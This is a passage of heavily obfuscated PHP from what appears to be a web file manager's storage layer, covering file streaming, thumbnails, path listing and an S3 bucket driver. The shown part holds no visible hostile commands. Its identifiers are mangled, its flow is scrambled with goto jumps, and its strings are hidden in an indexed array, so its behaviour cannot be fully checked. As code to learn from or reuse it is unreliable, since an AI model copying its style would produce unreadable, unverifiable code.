1000 * ($cŞÜ¦ä‹œÔ / $b‹ÂÀÆ„ö˜)); } while ($EÉÛÙ°»Ñ¹ <= $fÅÙÙìæ¿) { $cê‡ÒÌª×† = timeFloat(); check_abort(); $fã‡ÕÎ‹´ê = $fÅÙÙìæ¿ - $EÉÛÙ°»Ñ¹ + 1; if ($fã‡ÕÎ‹´ê <= $cŞÜ¦ä‹œÔ) { $cŞÜ¦ä‹œÔ = $fã‡ÕÎ‹´ê; } echo $this->fileSubstr($b…ùô¾Ëõä, $EÉÛÙ°»Ñ¹, $cŞÜ¦ä‹œÔ); $EÉÛÙ°»Ñ¹ += $cŞÜ¦ä‹œÔ; if ($cŞÜ¦ä‹œÔ == $fã‡ÕÎ‹´ê) { $EÉÛÙ°»Ñ¹ = $fÅÙÙìæ¿ + 1; } if ($AÏ³íÏ‹) { $EÍÛˆŸ…ª¼ = intval(1000 * 1000 * (timeFloat() - $cê‡ÒÌª×†)); $b˜§‹ŒĞ¨ = $AÏ³íÏ‹ - $EÍÛˆŸ…ª¼; if ($b˜§‹ŒĞ¨ > 5) { usleep($b˜§‹ŒĞ¨); } } } goto C×®–Æ±–‡; b¢Ô»İèŒ: header($ağ‘†ç¨‚[135] . $CÇ„¯§–ó); header($ağ‘†ç¨‚[136]); if (!$E®™…âéÍ && $F°§ÈŒØÕ == $ağ‘†ç¨‚[137]) { if ($CÇ„¯§–ó > 1024 * 1024 * 5) { die; } $FÀä«òé×´ = $this->getContent($b…ùô¾Ëõä); $FÀä«òé×´ = Html::clearSVG($FÀä«òé×´); header($ağ‘†ç¨‚[138] . $CÇ„¯§–ó); echo $FÀä«òé×´; die; } goto d¿ŠÅòåé; cšØƒ½ÉîË: if (isset($_SERVER[$ağ‘†ç¨‚[128]]) && strtotime($_SERVER[$ağ‘†ç¨‚[128]]) == $aª°öÛ˜ø[$ağ‘†ç¨‚[107]]) { header($ağ‘†ç¨‚[129], !0, 304); die; } if (isset($_SERVER[$ağ‘†ç¨‚[130]]) && $_SERVER[$ağ‘†ç¨‚[130]] == $A×œ¶¯Áº) { header($ağ‘†ç¨‚[131] . $A×œ¶¯Áº, !0, 304); die; } header($ağ‘†ç¨‚[131] . $A×œ¶¯Áº); goto Eê÷ç ˜¼Æ; d²“îéô×: if ($_SERVER[$ağ‘†ç¨‚[154]] == $ağ‘†ç¨‚[155]) { return; } $cŞÜ¦ä‹œÔ = 1024 * 100; $AÏ³íÏ‹ = 0; goto F¡½áŞ¹é‚; BÍ™¶Ã£—: $cĞ£Ï»õÊ = !0; if ($_SERVER[$ağ‘†ç¨‚[151]] == $ağ‘†ç¨‚[152] && $CÇ„¯§–ó > 1204 * 1024 * 1024 * 2) { $cĞ£Ï»õÊ = !1; } if ($cĞ£Ï»õÊ) { header($ağ‘†ç¨‚[153] . ($fÅÙÙìæ¿ - $EÉÛÙ°»Ñ¹ + 1)); } goto d²“îéô×; C·İ¿ÜØ: $ağ‘†ç¨‚ =& $_SERVER[í™]; $this->cacheMethod(null, null); if (!$b…ùô¾Ëõä || !$this->exist($b…ùô¾Ëõä)) { show_json(LNG($ağ‘†ç¨‚[101]), !1, $BáÈêÆ”‡„); } goto C±Ëª…Ÿ«; C×®–Æ±–‡: } public function fileOutServer($C¹£™¥›éœ, $aï¹âœŞÔ = false, $fÈöÌ…ÃÈ = false, $bÚªäÅ†’š = '') { $this->fileOut($C¹£™¥›éœ, $aï¹âœŞÔ, $fÈöÌ…ÃÈ, $bÚªäÅ†’š); } public function fileOutLink($Dˆâ´ì¦œÒ) { header($_SERVER[í™][156] . $Dˆâ´ì¦œÒ); die; } public function cacheMethod($fÏÕ ¾´Ü, $f½¸¼¡Ëİ´) { goto d§ÎöÛÁªâ; fáÀ×šøç: $bõñç•¸áñ = isset($E¥ˆÄŒˆÓ[$A­¥É¿ù›½]) ? $E¥ˆÄŒˆÓ[$A­¥É¿ù›½] : null; if (!is_null($bõñç•¸áñ)) { return $bõñç•¸áñ; } $bõñç•¸áñ = $this->{$fÏÕ ¾´Ü}($f½¸¼¡Ëİ´); goto eÜĞœ‹Í¦²; fÌÒˆÈ: $A­¥É¿ù›½ = $F¦£‚œº¯Â[157] . $fÏÕ ¾´Ü . $F¦£‚œº¯Â[158] . rtrim($DàÌ²‡â”, $F¦£‚œº¯Â[8]); if (is_null($fÏÕ ¾´Ü)) { $E¥ˆÄŒˆÓ = array(); return; } if (is_null($f½¸¼¡Ëİ´)) { unset($E¥ˆÄŒˆÓ[$A­¥É¿ù›½]); return; } goto fáÀ×šøç; eÜĞœ‹Í¦²: $E¥ˆÄŒˆÓ[$A­¥É¿ù›½] = $bõñç•¸áñ; return $bõñç•¸áñ; goto bâ±•±£ä; d§ÎöÛÁªâ: $F¦£‚œº¯Â =& $_SERVER[í™]; static $E¥ˆÄŒˆÓ = array(); $DàÌ²‡â” = $f½¸¼¡Ëİ´ ? ltrim($this->getPathOuter($f½¸¼¡Ëİ´), $F¦£‚œº¯Â[8]) : $f½¸¼¡Ëİ´; goto fÌÒˆÈ; bâ±•±£ä: } public function fileOutImage($a‘ö‰¿—¤, $f­«…ô‹º = 250) { goto cõÈùòÏ‰„; bÌ™•ö÷ôİ: if (!($AÄçàÚáìê = IO::move($BŒÈÁœ¨Ç, $b…Ë—æšŠ…))) { return IO::fileOut($BŒÈÁœ¨Ç); } del_file($BŒÈÁœ¨Ç); IO::fileOut($AÄçàÚáìê); goto e÷ŠÑÕ„˜ê; d´’í´…Ÿ™: if (!($eö‰¥„¹…Ø = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $d¨æÀŒºŒó[165]))) { $b…Ë—æšŠ… = IO::mkdir(IO_PATH_SYSTEM_TEMP . $d¨æÀŒºŒó[166]); } else { $b…Ë—æšŠ… = KodIO::make($eö‰¥„¹…Ø); } if ($eö‰¥„¹…Ø = IO::fileNameExist($b…Ë—æšŠ…, $bêù”¿«ƒ°)) { $BŒÈÁœ¨Ç = KodIO::make($eö‰¥„¹…Ø); return IO::fileOut($BŒÈÁœ¨Ç); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto FÅ„Ê¤¯Øã; cõÈùòÏ‰„: $d¨æÀŒºŒó =& $_SERVER[í™]; if (substr($a‘ö‰¿—¤, 0, 4) == $d¨æÀŒºŒó[144]) { $this->fileOutLink($a‘ö‰¿—¤); } $e¿›é‡Ã´Š = $this->info($a‘ö‰¿—¤); goto d ‰õŞˆò¤; FÅ„Ê¤¯Øã: $BŒÈÁœ¨Ç = DATA_THUMB . $bêù”¿«ƒ°; if (!@file_exists($BŒÈÁœ¨Ç)) { $fÂáç¤ÓĞ‘ = TEMP_FILES; if (!is_dir($fÂáç¤ÓĞ‘)) { mk_dir($fÂáç¤ÓĞ‘); } $F±Ø‡•’ƒÜ = $fÂáç¤ÓĞ‘ . $Fè¼‚¯ñ‹² . $d¨æÀŒºŒó[91] . $e¿›é‡Ã´Š[$d¨æÀŒºŒó[160]]; if (!@file_exists($F±Ø‡•’ƒÜ)) { $F±Ø‡•’ƒÜ = $this->download($a‘ö‰¿—¤, $F±Ø‡•’ƒÜ); } $B•“ÉññÄ = new ImageThumb($F±Ø‡•’ƒÜ, $d¨æÀŒºŒó[167]); $B•“ÉññÄ->prorate($BŒÈÁœ¨Ç, $f­«…ô‹º, $f­«…ô‹º * 10); } if (!file_exists($BŒÈÁœ¨Ç) || filesize($BŒÈÁœ¨Ç) < 100) { return @file_exists($F±Ø‡•’ƒÜ) ? IO::fileOut($F±Ø‡•’ƒÜ) : $this->fileOut($a‘ö‰¿—¤); } goto bÌ™•ö÷ôİ; d ‰õŞˆò¤: if ($e¿›é‡Ã´Š[$d¨æÀŒºŒó[77]] <= 1024 * 50 || !function_exists($d¨æÀŒºŒó[159]) || $e¿›é‡Ã´Š[$d¨æÀŒºŒó[160]] == $d¨æÀŒºŒó[161]) { return $this->fileOut($a‘ö‰¿—¤); } if (isset($e¿›é‡Ã´Š[$d¨æÀŒºŒó[162]][$d¨æÀŒºŒó[163]])) { $Fè¼‚¯ñ‹² = $e¿›é‡Ã´Š[$d¨æÀŒºŒó[162]][$d¨æÀŒºŒó[163]]; } else { if (isset($e¿›é‡Ã´Š[$d¨æÀŒºŒó[162]][$d¨æÀŒºŒó[164]])) { $Fè¼‚¯ñ‹² = $e¿›é‡Ã´Š[$d¨æÀŒºŒó[162]][$d¨æÀŒºŒó[164]]; } else { $Fè¼‚¯ñ‹² = md5("{$e¿›é‡Ã´Š[$d¨æÀŒºŒó[28]]}\137{$e¿›é‡Ã´Š[$d¨æÀŒºŒó[75]]}\137{$e¿›é‡Ã´Š[$d¨æÀŒºŒó[77]]}"); } } $bêù”¿«ƒ° = "{$Fè¼‚¯ñ‹²}\x5f{$f­«…ô‹º}\56\160\x6e\147"; goto d´’í´…Ÿ™; e÷ŠÑÕ„˜ê: } public function fileOutImageServer($ašÀ¶à•¸, $Bé‘Àîå‚ = 250) { $this->fileOutImage($ašÀ¶à•¸, $Bé‘Àîå‚); } public function fileNameAuto($Eõ“ô…ç»Ï, $f£°óáÉõ’, $BÃƒ›—”º‰ = REPEAT_RENAME, $Bù•œ²ãáÜ = false) { goto AŸ©²¤£¼Ô; F¤Ä‰ÉÙ: if ($BÃƒ›—”º‰ == REPEAT_SKIP) { return !1; } $FÂ‡ÏÎ¼— = $aª»¢é·Ò›[91] . get_path_ext($f£°óáÉõ’); $FÂ‡ÏÎ¼— = $FÂ‡ÏÎ¼— == $aª»¢é·Ò›[91] || $Bù•œ²ãáÜ ? $aª»¢é·Ò›[33] : $FÂ‡ÏÎ¼—; goto a¨‰™ˆãÃÆ; AŸ©²¤£¼Ô: $aª»¢é·Ò› =& $_SERVER[í™]; $Eª¸Š¨© = $Eõ“ô…ç»Ï === $aª»¢é·Ò›[33] ? $f£°óáÉõ’ : rtrim($Eõ“ô…ç»Ï, $aª»¢é·Ò›[8]) . $aª»¢é·Ò›[8] . $f£°óáÉõ’; if ($BÃƒ›—”º‰ == REPEAT_REPLACE || !$this->exist($Eª¸Š¨©) || $Bù•œ²ãáÜ && $BÃƒ›—”º‰ != REPEAT_RENAME_FOLDER) { return $f£°óáÉõ’; } goto F¤Ä‰ÉÙ; a¨‰™ˆãÃÆ: $CŠäˆÌåóØ = 1; $cš±®‚ßí = substr($f£°óáÉõ’, 0, strlen($f£°óáÉõ’) - strlen($FÂ‡ÏÎ¼—)); $eÃÄ¤Æ•ó† = $cš±®‚ßí . "\50{$CŠäˆÌåóØ}\51{$FÂ‡ÏÎ¼—}"; goto Bƒ‚æÄ™ö‹; Bƒ‚æÄ™ö‹: while ($this->exist(rtrim($Eõ“ô…ç»Ï, $aª»¢é·Ò›[8]) . $aª»¢é·Ò›[8] . $eÃÄ¤Æ•ó†)) { $eÃÄ¤Æ•ó† = $cš±®‚ßí . "\50{$CŠäˆÌåóØ}\51{$FÂ‡ÏÎ¼—}"; $CŠäˆÌåóØ++; } return $eÃÄ¤Æ•ó†; goto C¦™·¼ö¨õ; C¦™·¼ö¨õ: } public function listAllFiles($BÃ§÷—Ø‘, $C å…à‚Œ¸, $a†°…™É×­ = array()) { goto cÏšÁ„§ìØ; cÏšÁ„§ìØ: $d¾•Ö Ñ± =& $_SERVER[í™]; if (empty($C å…à‚Œ¸)) { return array(); } $C¸ßâã£à˜ = array(); goto FÎÃùÅ¿‡¤; FÎÃùÅ¿‡¤: $BÃ§÷—Ø‘ = trim($BÃ§÷—Ø‘, $d¾•Ö Ñ±[8]); foreach ($C å…à‚Œ¸ as $aÚÏïï†¨É) { $fÇé†ĞÚšñ = ltrim(substr($aÚÏïï†¨É, strlen($BÃ§÷—Ø‘)), $d¾•Ö Ñ±[8]); $C¸ßâã£à˜ = array_merge($C¸ßâã£à˜, $this->slicePath($fÇé†ĞÚšñ)); } $Dğ—¤Œ’á = array(); goto bÈ¤¬‰‚¨Ó; bÈ¤¬‰‚¨Ó: foreach (array_unique($C¸ßâã£à˜) as $aÚÏïï†¨É) { $Dïùêš¤Œ = array($d¾•Ö Ñ±[75] => $this->getPathOuter($d¾•Ö Ñ±[8] . $BÃ§÷—Ø‘ . $d¾•Ö Ñ±[8] . $aÚÏïï†¨É), $d¾•Ö Ñ±[76] => 1, $d¾•Ö Ñ±[77] => 0); if (substr($aÚÏïï†¨É, -1) != $d¾•Ö Ñ±[8]) { $Dïùêš¤Œ[$d¾•Ö Ñ±[76]] = 0; $BÆ„÷—ë×¬ = $this->getPath($BÃ§÷—Ø‘ . $d¾•Ö Ñ±[8] . $aÚÏïï†¨É); $Dïùêš¤Œ[$d¾•Ö Ñ±[77]] = isset($a†°…™É×­[$BÆ„÷—ë×¬]) ? $a†°…™É×­[$BÆ„÷—ë×¬] : $this->size($BÆ„÷—ë×¬); } $Dğ—¤Œ’á[] = $Dïùêš¤Œ; } return $Dğ—¤Œ’á; goto c¿ùšÀÎ¸ï; c¿ùšÀÎ¸ï: } public function slicePath($fˆ‰Ç¯•ÉÉ) { $CÁŸŠÊ…Û =& $_SERVER[í™]; $b­ß†ĞøàÒ = explode($CÁŸŠÊ…Û[8], trim($fˆ‰Ç¯•ÉÉ, $CÁŸŠÊ…Û[8])); $Dˆ‰öÁ•‰“ = 0; do { ++$Dˆ‰öÁ•‰“; $aœ¢ãòÙ[] = implode($CÁŸŠÊ…Û[8], array_slice($b­ß†ĞøàÒ, 0, $Dˆ‰öÁ•‰“)) . $CÁŸŠÊ…Û[8]; } while ($Dˆ‰öÁ•‰“ < count($b­ß†ĞøàÒ)); $aœ¢ãòÙ[count($b­ß†ĞøàÒ) - 1] = $fˆ‰Ç¯•ÉÉ; return $aœ¢ãòÙ; } public function getHost() { $F‘—Ş¥œ¸ =& $_SERVER[í™]; $fïæ„‹ã‰ = parse_url(trim($this->domain, $F‘—Ş¥œ¸[8])); $fñõ¦¾„ò… = isset($fïæ„‹ã‰[$F‘—Ş¥œ¸[168]]) ? $fïæ„‹ã‰[$F‘—Ş¥œ¸[168]] : http_type(); $båÇÚÆ±‡ = isset($fïæ„‹ã‰[$F‘—Ş¥œ¸[169]]) ? $fïæ„‹ã‰[$F‘—Ş¥œ¸[169]] : $fïæ„‹ã‰[$F‘—Ş¥œ¸[75]]; if (isset($fïæ„‹ã‰[$F‘—Ş¥œ¸[170]])) { $båÇÚÆ±‡ .= $F‘—Ş¥œ¸[4] . $fïæ„‹ã‰[$F‘—Ş¥œ¸[170]]; } return $fñõ¦¾„ò… . $F‘—Ş¥œ¸[171] . $båÇÚÆ±‡; } public function pathEncode($c¿¿½ÜâµŞ) { $C¤ÂÔ¯Ç“ =& $_SERVER[í™]; return str_replace($C¤ÂÔ¯Ç“[172], $C¤ÂÔ¯Ç“[8], rawurlencode($c¿¿½ÜâµŞ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($bŠí—×™¤Ë) { set_timeout(); require_once SDK_DIR . $_SERVER[í™][173]; parent::__construct(); $this->_init($bŠí—×™¤Ë); } public function _init($eøŞ·ø’¸ó) { foreach ($eøŞ·ø’¸ó as $Cî£¾«½‘ => $a ‘Ôš¬”ô) { if (isset($this->{$Cî£¾«½‘})) { $this->{$Cî£¾«½‘} = $a ‘Ôš¬”ô; } } $this->endpoint = $eøŞ·ø’¸ó[$_SERVER[í™][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($câ³Ü¤–â = "\x76\64") { $this->signVer = $câ³Ü¤–â; $this->client->setSignatureVersion($câ³Ü¤–â); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Bó‰â¤ÄğÍ; D“öëÁ¡ é: if ($AÖ‚ÀÎ¬ª‡[$a®„Æ˜’ËÊ[175]] != $a®„Æ˜’ËÊ[176] || $AÖ‚ÀÎ¬ª‡[$a®„Æ˜’ËÊ[177]] != $a®„Æ˜’ËÊ[176]) { return !1; } $a·¿Ô¸óø‘ = array_map($a®„Æ˜’ËÊ[178], $AÖ‚ÀÎ¬ª‡[$a®„Æ˜’ËÊ[179]]); if (!is_array($a·¿Ô¸óø‘)) { $a·¿Ô¸óø‘ = array(); } goto e‹åÍ”›´’; e‹åÍ”›´’: $fª˜…ÁËƒ¿ = array($a®„Æ˜’ËÊ[180], $a®„Æ˜’ËÊ[181], $a®„Æ˜’ËÊ[182], $a®„Æ˜’ËÊ[183], $a®„Æ˜’ËÊ[184]); $D“ƒµÛÑƒ = array_diff($fª˜…ÁËƒ¿, $a·¿Ô¸óø‘); return empty($D“ƒµÛÑƒ); goto A÷­‘„Í¾; Bó‰â¤ÄğÍ: $a®„Æ˜’ËÊ =& $_SERVER[í™]; $AÖ‚ÀÎ¬ª‡ = $this->getBucketCors(); if (!$AÖ‚ÀÎ¬ª‡ || !is_array($AÖ‚ÀÎ¬ª‡)) { return !1; } goto D“öëÁ¡ é; A÷­‘„Í¾: } public function mkfile($bƒÒƒÇï½, $e‰ší¤Œ¡Ã = '', $fî·“÷·–ç = REPEAT_RENAME) { $eùÆÂ¼‰‰ = $this->setContent($bƒÒƒÇï½, $e‰ší¤Œ¡Ã); if ($eùÆÂ¼‰‰ !== !1) { return $this->getPathOuter($bƒÒƒÇï½); } return !1; } public function mkdir($Dßš÷ÛÌ¼, $EõÒ‚ö÷Ëï = REPEAT_SKIP) { if (empty($Dßš÷ÛÌ¼)) { return !1; } if ($this->_isFolder($Dßš÷ÛÌ¼)) { return $this->getPathOuter($Dßš÷ÛÌ¼); } $Fâ„®…”„Â = $this->setContent($Dßš÷ÛÌ¼, $_SERVER[í™][33], !0); if ($Fâ„®…”„Â !== !1) { return $this->getPathOuter($Dßš÷ÛÌ¼); } return !1; } public function copyFile($aŸòÂâ”¦», $D‚â¨Ñá, $dİ÷¨Ö§ÁÔ = array()) { $f¹±¿²Ú†Ÿ =& $_SERVER[í™]; $F…‡ßã÷¤ = $this->objectMeta($aŸòÂâ”¦»); if (!$F…‡ßã÷¤) { return !1; } if ($F…‡ßã÷¤[$f¹±¿²Ú†Ÿ[77]] <= 1024 * 1024 * 200) { $E“»®ØÊ¢ì = $this->client->copyObject($this->bucket, $aŸòÂâ”¦», $this->bucket, $D‚â¨Ñá, $f¹±¿²Ú†Ÿ[185], $dİ÷¨Ö§ÁÔ); } else { $E“»®ØÊ¢ì = $this->client->multiCopyObject($this->bucket, $aŸòÂâ”¦», $this->bucket, $D‚â¨Ñá, $dİ÷¨Ö§ÁÔ); } $E“»®ØÊ¢ì = $E“»®ØÊ¢ì ? $this->getPathOuter($D‚â¨Ñá) : !1; return $E“»®ØÊ¢ì; } public function moveFile($e†Úàô²™‡, $d“—æøŠì¹) { if ($this->copyFile($e†Úàô²™‡, $d“—æøŠì¹)) { $this->delFile($e†Úàô²™‡); return $this->getPathOuter($d“—æøŠì¹); } return !1; } public function delFile($bìùöŒ°‹) { return $this->client->deleteObject($this->bucket, $bìùöŒ°‹); } public function delFolder($Cì‰‹¶ƒø’) { goto Cî¢ƒğœİŸ; Cî¢ƒğœİŸ: $D®ğÉ†‚– =& $_SERVER[í™]; $f†Ãƒ¿ô™ë = $this->listObjs($Cì‰‹¶ƒø’); if (!$f†Ãƒ¿ô™ë) { $Cì‰‹¶ƒø’ = trim($Cì‰‹¶ƒø’, $D®ğÉ†‚–[8]); if (!empty($Cì‰‹¶ƒø’)) { $Cì‰‹¶ƒø’ .= $D®ğÉ†‚–[8]; } return $this->delFile($Cì‰‹¶ƒø’); } goto cÛî²¸æ´å; DØ¯ß¢ºŒö: return $fß°Ó·ÊŸ === $dÀøòÁŸƒè ? !0 : !1; goto CÆÙÉ§­š; cÛî²¸æ´å: $fß°Ó·ÊŸ = $dÀøòÁŸƒè = 0; $a«† •Ó»ë = array_chunk(array_keys($f†Ãƒ¿ô™ë), 1000); foreach ($a«† •Ó»ë as $dâª ñ•) { $fß°Ó·ÊŸ++; $dÀøòÁŸƒè += (int) $this->client->deleteObjects($this->bucket, $dâª ñ•); } goto DØ¯ß¢ºŒö; CÆÙÉ§­š: } public function rename($dº¿’µßÓ·, $d¸º¦Ğº£») { return $this->renameObject($dº¿’µßÓ·, $d¸º¦Ğº£»); } public function listPath($dÀ†„±‡´Â, $bÏÈ°êæË„ = false) { $bÔğ¼ìèÍÍ =& $_SERVER[í™]; $F¸¤Ã‘‡ê¡ = $this->listObjs($dÀ†„±‡´Â, null, null, $bÔğ¼ìèÍÍ[8]); $eÈ‡Û«‰½Ì = array($bÔğ¼ìèÍÍ[74] => array(), $bÔğ¼ìèÍÍ[73] => array()); foreach ($F¸¤Ã‘‡ê¡ as $E–ëàñ¶³ => $cù‹Œ±¹äá) { if ($E–ëàñ¶³ == $bÔğ¼ìèÍÍ[8]) { continue; } if (isset($cù‹Œ±¹äá[$bÔğ¼ìèÍÍ[186]])) { $eÈ‡Û«‰½Ì[$bÔğ¼ìèÍÍ[74]][] = $this->folderInfo($cù‹Œ±¹äá[$bÔğ¼ìèÍÍ[186]], $bÏÈ°êæË„); } else { if (substr($cù‹Œ±¹äá[$bÔğ¼ìèÍÍ[28]], -1) == $bÔğ¼ìèÍÍ[8]) { continue; } $eÈ‡Û«‰½Ì[$bÔğ¼ìèÍÍ[73]][] = $this->fileInfo($cù‹Œ±¹äá[$bÔğ¼ìèÍÍ[28]], $bÏÈ°êæË„, $cù‹Œ±¹äá); } } return $eÈ‡Û«‰½Ì; } private function fileInfo($e¨îÔƒ½”», $B±·¤¸¢ğµ = false, $c³°£·ğ‹› = array()) { goto fØ¯éÀø„®; D¡í­ÈÑ£ª: if (empty($c³°£·ğ‹›)) { $c³°£·ğ‹› = $this->objectMeta($e¨îÔƒ½”»); if (!$c³°£·ğ‹›) { return $d–³ğµÄ‰ö; } } if (isset($c³°£·ğ‹›[$e–¨‡À–Œî[190]])) { $d–³ğµÄ‰ö[$e–¨‡À–Œî[107]] = $c³°£·ğ‹›[$e–¨‡À–Œî[190]]; } if (isset($c³°£·ğ‹›[$e–¨‡À–Œî[77]])) { $d–³ğµÄ‰ö[$e–¨‡À–Œî[77]] = $c³°£·ğ‹›[$e–¨‡À–Œî[77]]; } goto CÍ³¢Ñö¾; CÍ³¢Ñö¾: return $d–³ğµÄ‰ö; goto f„ÈñŠï; fØ¯éÀø„®: $e–¨‡À–Œî =& $_SERVER[í™]; if ($B±·¤¸¢ğµ) { return array($e–¨‡À–Œî[28] => $this->pathThis($e¨îÔƒ½”»), $e–¨‡À–Œî[75] => $this->getPathOuter($e¨îÔƒ½”»), $e–¨‡À–Œî[29] => $e–¨‡À–Œî[167], $e–¨‡À–Œî[160] => $this->ext($e¨îÔƒ½”»), $e–¨‡À–Œî[77] => isset($c³°£·ğ‹›[$e–¨‡À–Œî[77]]) ? $c³°£·ğ‹›[$e–¨‡À–Œî[77]] : 0, $e–¨‡À–Œî[187] => 0, $e–¨‡À–Œî[107] => 0, $e–¨‡À–Œî[188] => !0, $e–¨‡À–Œî[189] => !0); } $d–³ğµÄ‰ö = array($e–¨‡À–Œî[28] => $this->pathThis($e¨îÔƒ½”»), $e–¨‡À–Œî[75] => $this->getPathOuter($e¨îÔƒ½”»), $e–¨‡À–Œî[29] => $e–¨‡À–Œî[167], $e–¨‡À–Œî[187] => 0, $e–¨‡À–Œî[107] => 0, $e–¨‡À–Œî[77] => 0, $e–¨‡À–Œî[160] => $this->ext($e¨îÔƒ½”»), $e–¨‡À–Œî[188] => !0, $e–¨‡À–Œî[189] => !0); goto D¡í­ÈÑ£ª; f„ÈñŠï: } private function folderInfo($Aº‹——”çø, $AÏ§”ø¤Ä¡ = false) { goto B®Û´èÀ; aĞµ‹áÊ: if ($Aº‹——”çø == $b¸±±Ó°••[33]) { return $b±š¯ òˆå; } $Aº‹——”çø = trim($Aº‹——”çø, $b¸±±Ó°••[8]) . $b¸±±Ó°••[8]; $fˆÁÕÀÉ¦ = $this->objectMeta($Aº‹——”çø); goto Då†¯†Œâ¿; B®Û´èÀ: $b¸±±Ó°•• =& $_SERVER[í™]; if ($AÏ§”ø¤Ä¡) { return array($b¸±±Ó°••[28] => $this->pathThis($Aº‹——”çø), $b¸±±Ó°••[75] => $this->getPathOuter($b¸±±Ó°••[8] . $Aº‹——”çø), $b¸±±Ó°••[29] => $b¸±±Ó°••[76], $b¸±±Ó°••[188] => !0, $b¸±±Ó°••[189] => !0); } $b±š¯ òˆå = array($b¸±±Ó°••[28] => $this->pathThis($Aº‹——”çø), $b¸±±Ó°••[75] => $this->getPathOuter($b¸±±Ó°••[8] . $Aº‹——”çø), $b¸±±Ó°••[29] => $b¸±±Ó°••[76], $b¸±±Ó°••[187] => 0, $b¸±±Ó°••[107] => 0, $b¸±±Ó°••[188] => !0, $b¸±±Ó°••[189] => !0); goto aĞµ‹áÊ; Då†¯†Œâ¿: if (isset($fˆÁÕÀÉ¦[$b¸±±Ó°••[190]])) { $b±š¯ òˆå[$b¸±±Ó°••[187]] = $fˆÁÕÀÉ¦[$b¸±±Ó°••[190]]; } return $b±š¯ òˆå; goto aï†çŸí; aï†çŸí: } public function listObjs($DÒ‘£æ¦×å, $B•õ‹•±ß¥ = null, $D¸Í½Ì¿èí = null, $bÜÔï®Š´ = null) { $c‚Ä½„¨İ» =& $_SERVER[í™]; $DÒ‘£æ¦×å = trim($DÒ‘£æ¦×å, $c‚Ä½„¨İ»[8]); $b•’˜Â–Éå = empty($DÒ‘£æ¦×å) ? $c‚Ä½„¨İ»[33] : $DÒ‘£æ¦×å . $c‚Ä½„¨İ»[8]; return $this->client->getBucket($this->bucket, $b•’˜Â–Éå, $B•õ‹•±ß¥, $D¸Í½Ì¿èí, $bÜÔï®Š´, !0); } public function has($a¡¨Òƒ¡Ì, $c¦İŠ‰‚¸„ = false, $BÇà“¬Í» = true) { goto BŒèæÈÎ”à; D·œ—ßÎ›: if ($c¦İŠ‰‚¸„) { return array($a‹ô·ï…ª²[191] => $fíÏÎ‰Í”, $a‹ô·ï…ª²[192] => $b“«†¡·¨); } return !1; goto B†ë·ÊÂÅ¦; BŒèæÈÎ”à: $a‹ô·ï…ª² =& $_SERVER[í™]; $fíÏÎ‰Í” = 0; $b“«†¡·¨ = 0; goto bÉ„¸ê¡–; bÉ„¸ê¡–: $Cğšª‰Â– = $this->listObjs($a¡¨Òƒ¡Ì, null, null, $a‹ô·ï…ª²[8]); $Cğšª‰Â– = is_array($Cğšª‰Â–) ? $Cğšª‰Â– : array(); foreach ($Cğšª‰Â– as $fóÁŠ’´İ‘) { if (isset($fóÁŠ’´İ‘[$a‹ô·ï…ª²[28]]) && substr($fóÁŠ’´İ‘[$a‹ô·ï…ª²[28]], -1) != $a‹ô·ï…ª²[8]) { if (!$c¦İŠ‰‚¸„ && $BÇà“¬Í») { return !0; } $fíÏÎ‰Í”++; } else { if (isset($fóÁŠ’´İ‘[$a‹ô·ï…ª²[186]])) { if (!$c¦İŠ‰‚¸„ && !$BÇà“¬Í») { return !1; } $b“«†¡·¨++; } } } goto D·œ—ßÎ›; B†ë·ÊÂÅ¦: } public function listAll($b™õ¦¼‰) { $c†Ù±ò‚İ˜ =& $_SERVER[í™]; $Bøİ¯Ÿ¿¥¸ = $this->listObjs($b™õ¦¼‰); $b‹Õ™ÜåõÎ = $d±İÈ‘İì¹ = array(); foreach ($Bøİ¯Ÿ¿¥¸ as $eÂ‹À¿óö => $fÒ¥ùæ¡ˆ) { $b‹Õ™ÜåõÎ[] = $fÒ¥ùæ¡ˆ[$c†Ù±ò‚İ˜[28]]; $d±İÈ‘İì¹[$eÂ‹À¿óö] = $fÒ¥ùæ¡ˆ[$c†Ù±ò‚İ˜[77]]; } return $this->listAllFiles($b™õ¦¼‰, $b‹Õ™ÜåõÎ, $d±İÈ‘İì¹); } public function canRead($B³“ßßÎßÄ) { $Fé½áéĞ¤Ê =& $_SERVER[í™]; $dÑòÂ¿ËäÄ = $this->client->getAccessControlPolicy($this->bucket, $B³“ßßÎßÄ); if (!$dÑòÂ¿ËäÄ) { return !1; } return in_array($dÑòÂ¿ËäÄ, array($Fé½áéĞ¤Ê[193], $Fé½áéĞ¤Ê[194], $Fé½áéĞ¤Ê[195])) ? !0 : !1; } public function canWrite($F¶‹äˆŒğÏ) { $Eá‘‹ÛÏ‡Ø =& $_SERVER[í™]; $A…Ô¬«èÄÑ = $this->client->getAccessControlPolicy($this->bucket, $F¶‹äˆŒğÏ); if (!$A…Ô¬«èÄÑ) { return !1; } return in_array($A…Ô¬«èÄÑ, array($Eá‘‹ÛÏ‡Ø[193], $Eá‘‹ÛÏ‡Ø[194])) ? !0 : !1; } public function getContent($EµÔø¿å¾¡) { return $this->client->getObject($this->bucket, $EµÔø¿å¾¡); } public function setContent($FØòôÂÃ†½, $Bçï¼–£‹ = '', $Dóçùç = false) { goto DìÆËç¦ŠÇ; fİ—åÈƒ å: $this->cacheMethod(null, null); $Eì¿½ºøâ = $this->copyFile($FØòôÂÃ†½, $FØòôÂÃ†½, array($d“åÊàÍ[196] => $Eì¿½ºøâ[$d“åÊàÍ[197]])); return $Eì¿½ºøâ ? !0 : !1; goto AÁµ¤ø©”´; DìÆËç¦ŠÇ: $d“åÊàÍ =& $_SERVER[í™]; $FØòôÂÃ†½ = $Dóçùç ? trim($FØòôÂÃ†½, $d“åÊàÍ[8]) . $d“åÊàÍ[8] : $FØòôÂÃ†½; $Cî¨ÛéÄæ‚ = get_file_mime(get_path_ext($FØòôÂÃ†½)); goto C”Üˆ…„Çç; 